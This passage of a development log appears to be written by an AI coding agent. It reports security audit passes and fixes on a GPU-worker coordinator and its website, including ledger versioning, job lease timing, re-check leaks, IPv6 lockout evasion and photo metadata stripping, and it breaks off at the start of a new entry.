+3. **Two programs upgrading at once crashed.** An old (Phase 1) ledger opened by two programs at the same moment, like the coordinator and an operator tool right after an update: **7 of 80 opens stopped with "duplicate column name"**. Both looked for missing columns, then both added the same one. The upgrade also wasn't one step: stopped halfway, it left some new columns and not others.
+4. **A restored ledger could fail to open.** Last session's restore leaves the ledger in SQLite's older "journal mode"; switching it back to the faster WAL mode needs a moment alone. With three programs starting together, **1 in 60 opens stopped with "database is locked"** instead of waiting its turn.
+
+**Shipped (`ledger-format-v1`)**
+- **The ledger says which format it is.** A format number (now 1) lives in the file's header (SQLite's `user_version`; 0 means "from before this rule").
+- **Code refuses a ledger newer than itself**, before changing a single byte: the coordinator, the operator tools, read-only checks, shared ledger copies and backups. The message says which formats, and that the real way back is restoring a backup made before the upgrade.
+- **The upgrade is one step.** New tables, columns, indexes and the format number go in one transaction holding the write lock, and everything is looked at again once the lock is held. A second program waits and finds nothing left to do; a crash leaves the old ledger exactly as it was. Same test after: **0 of 120 opens failed** (and 0 of 90 with three programs at once).
+- **The upgrade is written down** (`ledger_format_upgraded`: from, to, rule), at the newest time already in the ledger so it can't move the ledger's clock (last week's clock rule).
+- **The WAL switch waits its turn** (up to 10 s, like every other lock). Restored ledger, three programs at once: **0 of 90** failed.
+- **The layout is frozen per format.** A fingerprint of every table, column and index is stored for each format, and a test compares a fresh ledger with it. Change the layout without raising the number and the test fails with instructions, so nobody can forget. An upgraded Phase 1 ledger matches a fresh one exactly.
+- **`python -m app.ledger_format check --db <ledger>`** (read-only): the ledger's format, whether this code can open it, whether it would upgrade it, and past upgrades. The operator health page and `app.backup check` show the format too.
+- **Proof.**
+  - Same tests after the fix: the future ledger is refused (file unchanged), the race above passes every time, the restored-ledger race too.
+  - 25 new tests, **2,407 total: 2,406 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses). Two of the new tests replay the old failures step by step ("duplicate column name", the future ledger opened), and one runs three real programs upgrading at once.
+  - I broke the new code 16 ways on purpose (no refusal on open, refusal only after the WAL switch, read-only or copy checks off, no transaction, no second look under the lock, event at the server's clock, event on a brand-new ledger, number not written, lock kept after a refusal, health without the format, backup check off, no WAL retry, number raised without a fingerprint, off by one, layout not sorted); **all 16 were caught.**
+- **Honest limits:** versions from before this one (0.5.67 and older) don't read the number, so they would still open a newer ledger. No coordinator has run for real, so no real ledger was ever made by one of them; just don't start an old version on a ledger. Going back to an older version means restoring a backup made before the upgrade, and work since then is lost (the restore tool tells you how much). Nothing needs doing on your side (there's a "good to know" line in USER_TODO).
+
+**What you learned**
+1. **Rolling back code can roll back security.** A "revoked" mark or a pause is only a rule if the code reading it knows about it. Old code reads the same file and simply doesn't see the newer rules.
+2. **Data should say what version it is.** A number in the file lets newer code upgrade it and older code say "not mine" instead of guessing. Every file format worth keeping has one (PDFs, Word files, databases).
+3. **Check, then act, while holding the lock.** "Is this column missing? Then add it" breaks when two programs both check before either acts. Taking the lock first and checking again under it is the fix, the same idea as two people not both booking the last seat.
+4. **Make forgetting impossible.** The format number only works if someone raises it. A test that fails when the layout changes without it turns "remember to" into "can't forget to".
+
+## 2026-11-28 (UTC): An honest AI job longer than a minute was thrown away (0.5.69)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the eighteenth "code audit" pass. The last few asked what the clock, the disk, a backup and an old version can do to the coordinator. This one asked a plainer question, the first one the RX 470s will ask: **can an honest rig finish an AI job before the coordinator gives up on it?**
+
+**Found, shown really happening** (old code, an in-process coordinator with the default settings; a fake clock stands in for the time the run takes, no model was run)
+1. **The coordinator only waited 60 seconds for any job.** When a rig takes a job it gets a "lease": if no answer comes back before the lease ends, the coordinator assumes the rig crashed and hands the job to someone else. Every lease was `LEASE_SECONDS`, 60 s. But an AI job is allowed to run for up to 300 s (`timeout_s`), and before running it the rig re-checks the whole model file.
+2. **Three honest rigs, zero results.** One AI job with a 120 s limit, three rigs in turn, each finishing in 61 s: all three answers were refused ("job is not awaiting a result"), each rig got a "lease timeout" on its record, and the job ended as `failed`.
+3. **Honest work showed up as cheating-like behaviour.** If another rig asked for work while the first was still running, it got the job, and the first rig's honest answer was logged as a "result for a job leased to someone else", which the reward report counts as a bad submission. Audits ran into the same wall, so an honest checker on a slow card looked exactly like a rig dodging the audits it was picked for (the warning on your health page).
+4. **Impossible jobs were accepted.** A job could be queued with a 10-second deadline and a 300-second run limit.
+
+**Shipped (`lease-fit-v1`)**
+- **Each job says how long an honest run may take.** For an AI job that's its own `timeout_s` (60 s if not set) plus about 30 s per GB of the pinned model file for the re-check; if the job's settings can't be read, the longest limit (300 s) is assumed, so a doubt makes the lease longer, never shorter. The CPU demo job says "near-instant" and keeps the plain 60 s lease.
+- **The lease is that plus 30 s for the network**, or `LEASE_SECONDS` if that's longer, and never past the job's own deadline (which is signed into the job and can't move).
+- **Jobs that can't be finished are refused when they're made.** A job or hidden test whose `ttl_seconds` is shorter than the lease it needs gets "ttl_seconds must be at least N" and nothing is stored. Re-checks copy the original job's window, which already passed. The private hidden-test pool sends 600 s by default, which covers even the slowest case (570 s).
+- Nothing else changed: same ledger layout, same signed job, same worker program.
+- **Proof.**
+  - The same three-rig story on the new code: the first rig's answer is accepted, no lease timeouts. A slow honest rig's reward report shows 0 lease timeouts and 0 bad submissions. A rig that really goes silent still loses the job, just at the end of the longer lease. An auditor taking 100 s of a 120 s limit counts as "completed", not "dropped".
+  - 32 new tests, **26 of them fail on the old code**. Five older tests assumed an AI lease ends after 31 s; they now ask the ledger when it really ends.
+  - **2,439 tests in total: 2,438 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - I broke the new code 15 ways on purpose (rule not passed to the claim, `min` instead of `max`, no deadline cap, no grace, grace on CPU jobs, no model re-check time, rounding down, unreadable settings treated as the default, deeply nested settings crashing it, a damaged model list crashing it, the deadline check off by one or missing on either route, the prompt echoed in the error); **all 15 were caught.**
+- **Honest limits:** a rig that crashes now holds an AI job longer before another rig gets it (up to about 9.5 minutes in the worst case: an 8 GB model and a 300 s limit). A job handed out again late in its life still only gets what's left of its deadline. "30 s per GB" for re-checking the model file is a guess for a slow disk; the rig will tell us the real number in Phase 3. There's a "good to know" line in USER_TODO; nothing to do now.
+
+**What you learned**
+1. **A timeout is a promise to both sides.** "You may take up to 300 s" (the job) and "I'll wait 60 s" (the lease) were two different promises that didn't fit together. When two limits describe the same wait, one should be derived from the other.
+2. **Honest and dishonest can look the same in the logs.** A slow honest rig and a rig that skips checks both "let the lease run out". Before blaming a rig, make sure the rules gave it a fair chance.
+3. **Refuse impossible work at the door.** A job that can't be finished before its deadline only wastes rigs' time later; saying no when it's created costs nothing.
+4. **When in doubt, err towards the safe side.** If a job's settings can't be read, assuming the longest run is the safe guess: the worst case is waiting a bit longer for a crashed rig, not throwing away honest work.
+
+## 2026-11-28 (UTC): A rig could tell whose work it was re-checking, from public pages (0.5.70)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the nineteenth "code audit" pass. Re-checks only work if a rig can't tell them from normal work: a cheater who knows "this one is a re-check" answers it honestly and fakes the rest. The threat model said spotting one took **two** rigs comparing prompts. This pass asked: **what can one rig, alone, learn from pages anyone can read?**
+
+**Found, shown really happening** (old code, an in-process coordinator; no model was run)
+1. **Every event had a number that counts up across the whole ledger.** The public job page (`GET /v1/jobs/{id}`, no login) listed each event with its `id`: 7, 8, 9, 10, … for everything that happens anywhere.
+2. **A re-check's number was the original's plus one.** A re-check is made in the same step that accepts the work it re-checks, so "result accepted" for the original was, say, number 18, and "job created" for the re-check was always 19.
+3. **So the rig doing a re-check could find whose work it was.** It opens its own job page (19), pages through the public ledger, opens each listed job, and finds the one whose "result accepted" is 18. This worked even with **six results accepted in the same second**, where the time alone can't decide.
+4. **And the rig being re-checked could count its own re-checks.** Same trick the other way round: "is there a job created right after my result was accepted?" That's its trust tier, which is meant to stay private.
+5. **Gaps gave away hidden events.** Private events (an auditor being picked, a hidden test aimed at a rig) were left off the page, but their numbers weren't skipped, so a missing number showed where one had been written.
+
+**Shipped (`public-events-v1`)**
+- **The public job page lists events without the number:** job, rig, event, detail, time. Same order as before (the database still sorts by the number internally, so two events in the same second never swap). The reply says `public_rules: ["public-events-v1"]`.
+- **Your operator views keep the numbers**, so nothing is lost for you.
+- Nothing else changed: same ledger layout, same signed job, same worker program.
+- **Proof.**
+  - The attack is written once as a test and run twice: on the operator's private data it finds the pair both ways (so it's a real attack, not a strawman), on the public pages it finds nothing.
+  - Every kind of job (normal work, re-check, tie-breaker, hidden test, aimed hidden test) shows only the five listed fields, and no public reply (ledger, health, any job page) has an `id` anywhere.
+  - A job that was rejected, handed out again and accepted, five events in one second, still shows them in the right order.
+  - 8 new tests, **4 of them fail on the old code**. **2,447 tests in total: 2,446 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - I broke the new code 9 ways on purpose (ids back, an id under another name, ids in the column list, a field missing, private events shown, newest first, sort by time and name, rule not listed, sort by time only); **8 were caught**. The 9th, sorting by time only, gives exactly the same order today, because events in the same second stay in the order they were written and the ledger's clock never goes backwards (0.5.65), so it isn't a bug.
+- **Honest limits (still open):** times are still shown to the second, and a re-check is still made in the same second its original is accepted. So a rig can look for "someone's result was accepted in the very second my job was made". With a few rigs each finishing one AI job a minute, an ordinary job shares its second with another rig's result about **3% of the time with 2 rigs, 8% with 5, 28% with 20**; a re-check does every time. That's a strong hint while the network is small, not proof. The fix is planned as its own slice (a short random wait before a re-check is released, signed when released); it needs a ledger format change, so it's in TASKS. Nothing to do on your side.
+
+**What you learned**
+1. **Numbers that count up tell strangers what happened next to what.** Ticket numbers, invoice numbers and database ids all leak order. If two things are made at the same moment, their numbers sit side by side.
+2. **Hiding a thing means hiding its shape too.** We hid the words "audit scheduled", but the gap it left in the numbering was still there, like a blacked-out line in a document that still shows how long the line was.
+3. **Test the attack, not just the fix.** Running the attacker's code on the full data first proves the attack is real; only then does "it finds nothing on the public pages" mean something.
+4. **Fix the exact leak first, then measure the fuzzy one.** The numbers gave a certain answer at any traffic level; the timing gives a probability that shrinks as more rigs join. Both matter, but they need different fixes.
+
+## 2026-11-28 (UTC): A re-check came out in the very second its original was accepted (0.5.71)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The last session left one software-only item open on purpose: re-checks could still be spotted by their timing. This session closed it (the twentieth "code audit" pass).
+
+**Found, shown really happening** (old code, an in-process coordinator; no model was run)
+1. **Same second, every time.** A re-check is made in the same step that accepts the result it re-checks. So its public "job created" time was always exactly the second the original's "result accepted" was written, and both times are public. Ordinary jobs only line up with someone's result now and then.
+2. **The deadline gave it away even without the job page.** A re-check gets the same time window as the original (300 s for a normal job), counted from that second. So "deadline minus 300" *was* the second the original was accepted, and the deadline is in the signed job every rig receives.
+3. **It could be taken at once**, so the rig that got it knew it had been made moments earlier.
+
+**Shipped (`recheck-release-v1`, ledger format 2)**
+- **A new re-check is held out of sight.** It's stored with a release time and nothing else public: no "job created", its job page says "unknown job", it isn't in the public counts, no rig can take it, and it can't expire (its life hasn't started).
+- **The wait is random:** a whole number of seconds between 60 and 600 (`RECHECK_DELAY_MIN_SECONDS` / `RECHECK_DELAY_MAX_SECONDS`), picked with the same secure randomness as audits.
+- **A small timer releases it at its own second.** Once a second the coordinator looks for re-checks that are due. Releasing one starts its life there: its creation time, its public "job created", and a new deadline (release time + the same window), signed again. Then a random rig is picked to do it, as before. I first thought of releasing them when a rig next asks for work, and dropped it: the release would then share a second with that rig's lease or result, which is a new tell.
+- **You can see it.** The operator health page shows how many re-checks are waiting, and warns if one is more than a minute past its release time (that means the timer isn't running).
+- **Ledger format 2.** One new column and index. Code from before refuses a format-2 ledger (it would hand held re-checks out at once); upgrading is the usual one locked step.
+- **Proof.**
+  - 14 new tests, **all 14 fail on the old code**. The first shows the leak with the hold switched off; the others cover hiding, release time, signature, randomness, no expiry, the late warning, tie-breakers, ledger copies, the timer starting, surviving an error and stopping.
+  - **A busy-network simulation** (5 rigs, 800 AI jobs over 4 simulated hours, every result re-checked). Hold off: 800 of 800 re-checks were in their original's second, and every re-check shared a second with someone's result, against 16% of ordinary jobs. Hold on: **0 of 800**, and re-checks and ordinary jobs shared a second with someone's result **equally often (14% each)**. A rig trying to guess whose work it got had a median of **72** accepted results to choose from.
+  - I broke the new code 15 ways on purpose (re-check not hidden from claims, from assignment or from expiry, no re-signing, held flag ignored, public counts including it, creation time not moved, public page showing it, a fixed wait, the deadline counted from the wrong second, no timer, the timer dying on an error, tie-breakers not held, the late warning always on, releasing one second early). **All 15 were caught**, two of them only after I added a test for the ledger's own checks.
+  - **2,461 tests in total: 2,460 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+- **Honest limits:** a result's check now finishes 1 to 10 minutes later. Prompts still repeat, so two rigs working together can still compare them. If you only ever queue work at fixed times, a job that appears in between is a hint. 60-600 s is a first guess; with very few results an hour, the window has few candidates in it. A "good to know" line is in USER_TODO; nothing to do now.
+
+**What you learned**
+1. **Timing is data.** Even with every label hidden, "made in the same second as X" tells people that two things are connected. Hiding a link means hiding *when*, not just *what*.
+2. **Check every field that's derived from the leak.** The obvious leak was the creation time; the quiet one was the deadline, computed from the same second and signed into the job. When you fix a leak, look for anything calculated from it.
+3. **The fix can't ride on someone else's action.** Releasing a re-check "when a rig next asks" would tie it to that rig's request, swapping one tell for another. A separate timer makes the release time belong to nobody.
+4. **Compare against the normal case, not against zero.** The goal wasn't "re-checks never share a second with anything" (ordinary jobs do, 14% of the time). It was "re-checks look exactly like ordinary jobs", and the simulation measured exactly that.
+
+## 2026-11-28 (UTC): One home network could get thousands of password guesses (0.5.72)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review), and `main` has nothing the drafts branch is missing. Every GPU item left needs the rig or one of your decisions, so this session did the twenty-first "code audit" pass. The coordinator locks out anyone who sends 10 wrong passwords (operator token, submitter token, rig keys) in 10 minutes, and limits how fast anyone can send requests. Both count "per address". This pass asked: **what does someone with lots of addresses get?**
+
+**Found, shown really happening** (old code; a real coordinator behind a stand-in proxy; no model was run)
+1. **One IPv6 home connection comes with billions of addresses.** With IPv6, an internet provider gives each home or server a whole block (a "/64": about 18 billion billion addresses), and a computer can use a different one for every request. That's normal, not a hack.
+2. **The lock-out counted each address separately.** So I sent 300 wrong operator tokens, each from a new address in one block: **all 300 were checked**, none refused. From a single address the same 300 gave 10 checked, 290 refused. The request limit could be dodged the same way.
+3. **And the list of visitors got slow.** The coordinator only started forgetting visitors after 10,000 of them, and then every new one made it read the whole list while every other request waited: 0.3 ms each at 10,000 known, 3.5 ms at 100,000. Memory grew with no ceiling.
+
+**Shipped (`client-prefix-v1`)**
+- **One IPv6 network counts as one visitor.** Addresses in the same /64 share one request limit and one set of 10 guesses (`IPV6_CLIENT_PREFIX`, default 64; 128 = the old way). IPv4 is unchanged: one address, one visitor. The operator health page names the whole block (`2001:db8:1:2::/64`), which is exactly what you'd paste into a firewall rule, and the log still never shows an address.
+- **A visitor list that stays small and fast.** Each new visitor looks at the two oldest entries and forgets any that is exactly like a brand-new one (limit refilled, no recent wrong password, nothing in progress). Forgetting those changes no answer, and it costs the same tiny amount (about 0.01 ms) whether 10,000 or 100,000 are known.
+- **A hard ceiling.** At most 50,000 visitors are kept (`RATE_LIMIT_MAX_CLIENTS`). If the list is full of ones that just sent wrong passwords, new visitors share one "overflow" slot with its own limit. That's the safe way to fail: newcomers are slowed down, nobody gets extra guesses, and the health page warns.
+- **Proof.**
+  - The same real-server run after the fix: **10 checked, 290 refused.**
+  - 18 new tests, **17 of them fail on the old code** (the 18th checks a used-up limit is never forgotten, which the old code also got right): the attack through a proxy and on a direct IPv6 connection, the shared request limit, the neighbouring network not affected, the old behaviour still available, one log tag per network, 30,000 new visitors in about 0.2 s (old code: 12.6 s), wrong passwords never forgotten early, and the overflow slot (also with 40 requests at once).
+  - I broke the new code 17 ways on purpose; **16 were caught**. The 17th (moving a visitor to the back of the list when it comes back) only changes which entries get looked at first, never what is counted, so it isn't a bug.
+  - **2,479 tests in total: 2,478 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+- **Honest limits:** two of your rigs on one IPv6 home network now share limits, like rigs behind one router already did. Someone with many networks (a provider may hand out 256 or even 65,536 blocks) still gets 10 guesses per block, so the real protection is a long random operator token; a "good to know" line is in USER_TODO. Over real HTTP at 20,000 new addresses the slow list only cost about 10% (the web server itself is the bigger cost at that size); the 3.5 ms figure is the coordinator's own time at 100,000. This container has no IPv6, so the direct-connection case is tested in-process, and the real-server run used the proxy path.
+
+**What you learned**
+1. **"Per address" means something different on IPv6.** On IPv4 an address is roughly one home. On IPv6 one home has billions, so anything that counts per address (limits, bans, "one vote each") has to count per network block instead.
+2. **Fail closed when memory runs out.** When the visitor list is full, the choice is "forget someone" (which could hand a guesser fresh tries) or "make newcomers share" (which slows strangers down). For a password lock-out, slowing strangers is the safe choice.
+3. **Only forget what makes no difference.** The new list doesn't forget "old" visitors, it forgets visitors that look exactly like new ones. That way cleaning up can never be used as a trick to reset a lock-out.
+4. **Measure the cost of the cleanup itself.** The old code did clean up, but the cleanup read the whole list each time, so it got slower exactly when it was under attack.
+
+## 2026-11-28 (UTC): Tools wrote their notes into a backup instead of the live ledger (0.5.73)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review), and `main` has nothing the drafts branch is missing. Every GPU item left needs the rig or one of your decisions, so this session did the twenty-second "code audit" pass. The threat model had one small open line under #11: "a copy made from a backup isn't recorded". This pass asked the wider question: **what happens when any tool is pointed at a backup instead of the live ledger?**
+
+**Why it matters.** Some tools leave a note in the ledger, and the coordinator relies on those notes later. "A copy of this period was shared" means the coordinator must never reuse that period's hidden tests (the rigs remember them). "This period was signed" means nothing may be filed into it afterwards. A revocation means that rig is out. If the note lands in a backup, the coordinator never sees it.
+
+**Found, shown really happening** (old code, an in-process coordinator and the real command-line tools; no model was run)
+1. **A shared copy made from a backup left its hidden tests usable.** The copy was made, its note went into the backup, and the live coordinator accepted the very same hidden test again (`200` instead of `409`). A rig that ran it would recognise it.
+2. **Signing a report from a backup "worked"** and recorded the signature in the backup only.
+3. **Revoking a rig, making an enrollment code or pausing on a backup "worked"** and changed nothing that mattered.
+4. **A backup copied over the ledger by hand started without a word**, and a rig revoked after the backup logged in again. The restore tool from 0.5.67 carries revocations forward, but nothing stopped someone from skipping it with `cp`.
+5. **Even just reading a backup changed it.** An unsigned report opened it for writing, switched its journal mode and left side files, so its fingerprint (sha256) changed.
+
+**Shipped (`ledger-role-v1`)**
+- **A backup now says it's a backup, inside the file.** SQLite has a 4-byte "which program is this file for" field in its header. `backup make` sets it to "backup", and a restore sets it to "replaced" on the old ledger it moves aside. The live ledger stays 0, so every existing ledger is unaffected. No table changes.
+- **Writing refuses anything but the live ledger.** The coordinator and every tool that leaves a note (`ledger_copy export`, `rewards report --sign`, `workers`, `incident pause/resume`) check that field before touching the file, and stop with one line saying what the file is and what to do. It's checked twice: once as raw bytes before any lock or side file is made, and once through SQLite before anything is switched.
+- **Reading still works, and now changes nothing.** An unsigned report, `review`, `vouches`, `incident status` and `backup check` all work on a backup, and the backup's fingerprint stays the same. `backup check` now shows `"ledger_role": "backup"`.
+- **`backup restore` is the way back.** It clears the mark on the ledger it puts in place (so the coordinator starts), and marks the one it moves aside. Going back to that old one is also a restore.
+- **Proof.**
+  - 17 new tests, **15 of them fail on the old code** (the other 2 check edge cases of reading the field, and that shared copies stay unmarked). They replay all five problems above, check every refusal leaves the backup byte-for-byte unchanged with no side files, check an unsigned report on a backup gives exactly the same numbers as the live ledger, and cover marks after a backup, a restore, a restore onto an empty disk, an old unmarked backup, and going back to a replaced ledger.
+  - One older test, which showed the hand-copy hole on purpose, now shows the refusal (and the hole only when the mark is wiped).
+  - Also run as real programs: each tool printed its one-line refusal and exited with 2, and the real web server refused to start on a hand-copied backup.
+  - I broke the new code 16 ways on purpose (each check removed, the wrong mark set, the restore not clearing or not setting marks, the wrong header position, only some roles refused, ...); **all 16 were caught.**
+  - **2,496 tests in total: 2,495 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+- **Honest limits:** only files made by these tools are marked. A backup made with `cp`, any backup made before today, and a hand copy of the live ledger all look live. The mark tells you what a file *is*; it can't tell two live ledgers on two computers apart. When the coordinator refuses to start, the message is at the bottom of a Python error printout (the same as the "ledger too new" refusal). A "good to know" line is in USER_TODO; nothing to do now.
+
+**What you learned**
+1. **A note is only useful if it lands where it's read.** Several safety rules here are "write it down, check it later". If the writing goes to the wrong file, the rule quietly stops working, with no error anywhere.
+2. **Make the file say what it is.** Instead of trusting people to point tools at the right file, the backup carries its own label, the way a photocopy might be stamped "COPY". Tools read the label, not the file name.
+3. **Reading should never change what you read.** A backup is evidence. Opening it "just to look" must leave it byte-for-byte the same, or you can't prove later it wasn't touched.
+4. **Close the shortcut, not just the official path.** The restore tool was already careful, but `cp` skipped all of it. The fix makes the shortcut fail loudly and points to the careful way.
+
+## 2026-11-28 (UTC): Five new pages: Mine, Tokenomics, Litepaper, Casino, Meme Lab (0.5.74)
+
+**Asked by you, live.** You picked: fresh Mine and Tokenomics drafts (your own drafts weren't in the repo, its history, your Drive or your artifacts), info-only casino page, all three Meme Lab parts, and a long technical litepaper.
+
+**Shipped**
+- `/mine`, `/tokenomics` (proposed numbers, each labelled; emission chart and table: 50% by year 3.5, 75% by year 7, cap 99,406,440), `/litepaper` (17 sections, every claim labelled built/tested/planned/undecided), `/casino` (not open, no sign-up, what must happen first, house rules, where to find help), `/meme-lab` (meme maker that runs in the browser with PNG download, brand kit, a reviewed submission form, gallery), `/meme-thanks`.
+- New pages linked from every subpage footer; the homepage is unchanged.
+- Fixed a display bug on all subpages: the big hero rings were painted over the header and the first section, dimming text.
+- Hype guard: the "100x" check no longer flags the CPU name "Ryzen 5 5600X".
+- **Proof:** site check and accessibility check pass on all pages; no sideways scroll at 390, 768 and 1440 px; no browser errors; the meme maker draws and exports; 2,503 tests (2,502 passing, 1 skipped).
+
+**What you learned**
+1. **A form for a gambling waitlist is itself a legal question**, so the casino page only informs.
+2. **Labels beat promises.** Marking each number "proposed" or "leaning" lets the page exist before the decision.
+3. **Layers matter in CSS.** A decoration placed "behind" can still paint over later content if it creates its own layer.
+
+## 2026-11-28 (UTC): Hidden photo data in Meme Lab pictures (0.5.75)
+
+**Why this, this hour.** CI was green on the drafts PR and every GPU-worker phase that doesn't need your rig or a decision from you is done, so I took the next "code audit" pass on the newest thing that takes files from strangers: the Meme Lab form from 0.5.74.
+
+**Found (on the old tree).** The posting steps were "save the picture into `assets/memes/` and list it". I made a phone-style photo carrying where it was taken (GPS), the phone's make and model, the date, an editing note with a `C:\Users\<real name>` path, a comment, and 5 KB of "motion photo" video stuck after the end of the picture. Saved and listed like that, it passed every CI check (site check, accessibility check, page tests: all green). Merged, it would have put the sender's home location on the website and in GitHub's history for good. A stray file that wasn't listed (a `.DS_Store`) would also have gone public.
+
+**Shipped**
+- `python -m app.meme_gallery add <file> --name boat-sunset --alt "..." --credit "..."`: keeps only what's needed to draw the picture (pixels, colours, animation), drops everything else, names the file by what it really is (a PNG called `.jpg` becomes `.png`), and adds the line to `gallery.json`. It never overwrites and won't add to a gallery that's already broken.
+- `python -m app.meme_gallery check`, a new CI step: fails if any picture in the folder still has hidden data, isn't listed, is a link, is listed twice, or if a list entry has odd fields, invisible characters or text the page would cut.
+- `python -m app.meme_gallery inspect <file>` shows what a picture carries without changing it.
+- Damaged files, files that aren't pictures, and pictures too big to show safely (over 8192 px a side, 40 megapixels or 8 MB) are refused. No image library is used: the tool walks the file's labelled parts and never decodes a stranger's pixels.
+- `/meme-lab` now says hidden details are removed before posting (true now, and CI enforces it). Your to-do line and the note inside `gallery.json` now point to the tool.
+
+**Proof**
+- 78 new tests (`tests/test_meme_gallery.py`), including 3,000 seeded damaged copies; the real-tree test passes.
+- 15 real pictures made with Pillow, ffmpeg and ImageMagick (GPS photos, CMYK, greyscale, progressive JPEG, colour profiles, animated PNG/WebP/GIF, a motion-photo tail): after cleaning, every frame is pixel-for-pixel the same, nothing hidden is left, and all 15 open in Chromium and ImageMagick at the right size.
+- 30,000 random damaged files: no crash, worst 4 ms; cleaning a cleaned file never changes it. A worst-case 8 MB file takes about 0.5 s.
+- I broke the new code 18 ways on purpose; all 18 were caught. An existing guard test also caught that I'd ended two name patterns with `$` (which lets a name end in a hidden line break); fixed to `\Z`.
+- **2,581 tests in total: 2,580 passing, 1 skipped** on the committed tree (the root-only test, as designed); the new tests also pass on Python 3.11 (what CI uses).
+- `/meme-lab` at 390, 768 and 1440 px: no sideways scroll, no browser errors; strict HTML parse, site check and accessibility check pass.
+
+**Honest limits:** the tool can't see what's *in* a picture (a face, a street sign, a username in a screenshot), so your look still matters. It can't clean anything already in git history (nothing is there yet). A photo the camera marked as "turned" will show turned once that note is removed; the tool warns you. CI checks pull requests; it can't stop a push made straight to `main`.
+
+**What you learned**
+1. **A photo is a picture plus a hidden note.** Phones write where and when it was taken, and which phone, into the file itself. You can't see it, but anyone who downloads the file can read it.
+2. **"Ignored" data is still data.** Browsers stop reading a JPEG at its end marker, so whatever is glued on after it (a video, a zip) is invisible on the page but fully there in the download.
+3. **Keep a list of what's allowed, not of what's bad.** The tool keeps the few parts needed to draw a picture and drops everything else, so new kinds of hidden data are dropped too without anyone having to know about them.
+
+## 2026-11-28 (UTC): The Meme Lab form now checks a picture before sending it (0.5.76)
+
+**Why this, this hour.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" means it's waiting for your review), and `main` has nothing the drafts branch is missing. Every GPU item left needs the rig or a decision from you, so this session did the twenty-fourth "code audit" pass, on the other half of last hour's work: what the Meme Lab submission form actually sends.
+
+**Found (old tree, real Chromium, the form's post caught before it left the browser)**
+1. **A 9 MB picture was sent anyway.** The page said "up to 8 MB", but nothing checked. Netlify refuses a form post over 8 MB, so the visitor would get an error page and lose the description and credit they typed.
+2. **A PDF was sent too.** The file picker's "pictures only" list is just a hint; anyone can switch it to "All files". A PDF renamed `.png` also went through.
+3. **"Send it in" could attach a broken file.** When the browser can't make the picture, it hands back nothing, and the old code turned that "nothing" into a 4-byte file containing the word `null`, then said "Added to the submission form below."
+4. **A picture the browser refuses to export** (a "tainted" canvas) threw an error nobody saw and left the visitor with no message.
+
+**Shipped**
+- The form checks the chosen file when it's picked, right after "Send it in", and again when Send is pressed (if the check is still running, Send waits for it): **under 7.5 MB** (room for the text fields under Netlify's 8 MB) and the **first bytes really are a PNG, JPEG, GIF or WebP**. Anything else blocks sending with the browser's own form message, and a new status line under the field says what's wrong (screen readers read it out).
+- A picture the browser can't make is never attached; the visitor gets "Your browser could not make the picture." instead, for Download and Send it in alike.
+- The page now says "under 7.5 MB … The form checks this before anything is sent."
+- This is a convenience, not the gate: your review and `python -m app.meme_gallery add` still check every file before it's posted.
+
+**Proof**
+- 14 runs in real Chromium after the fix: the 9 MB file, the PDF, the renamed PDF, the empty file and a too-big file sent the instant it was picked were all stopped (nothing posted); a real JPEG, GIF, WebP and PNG, a normal "Send it in", and swapping a too-big file for a small one were posted; the failed and refused pictures gave the message and attached nothing; no browser errors. The worst case the maker can produce (a random-noise photo in the tall format) is 4.6 MB, well under the limit.
+- 7 new tests (`tests/test_meme_form.py`), **6 fail on the old code**. One runs the page's own picture check under Node against 14 sample files.
+- I broke the new code 12 ways on purpose; **11 were caught**. The 12th removed a length check that the next check already covers, so nothing changed.
+- `/meme-lab` at 390, 768 and 1440 px: no sideways scroll, no browser errors; strict HTML parse, site check and accessibility check pass.
+- **2,588 tests in total: 2,587 passing, 1 skipped** (the root-only test, as designed).
+
+**Honest limits:** browsers without `requestSubmit` (Safari before 16) still get the check when the file is picked, just not the "wait for it" on Send. The page can't know Netlify's exact limit (8,000,000 or 8,388,608 bytes), so it stays under both. Nothing was sent to the real Netlify form from here.
+
+**What you learned**
+1. **A file picker's filter is a suggestion.** `accept="image/png,…"` only sets what the picker shows first. The page has to look at the file itself, and the server side (your review and the gallery tool) has to look again.
+2. **Check the file's first bytes, not its name.** Every picture format starts with a fixed "signature" (PNG files start with `‰PNG`, JPEGs with `FF D8 FF`). A renamed PDF keeps its `%PDF` start, so it's caught.
+3. **"Nothing" can turn into something.** Wrapping a missing value in a file made the text `null`, a real file that looked fine to the form. Check for "nothing" before using a value.
+4. **Fail before the upload, not after.** Stopping a too-big file in the browser saves the visitor's typing and a wasted 9 MB upload.
+
+## 2026-11-28 (UTC): Names and device IDs kept out of the tester form (0.5.77)
+
+**Why this, this hour.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" means it's waiting for your review), and `main` has nothing the drafts branch is missing. Every GPU item left needs the rig or a decision from you, so this session did the twenty-fifth "code audit" pass, on the other form strangers fill in: the GPU tester sign-up on `/contribute`, and the command it tells them to run.
+
+**Found (old tree)**
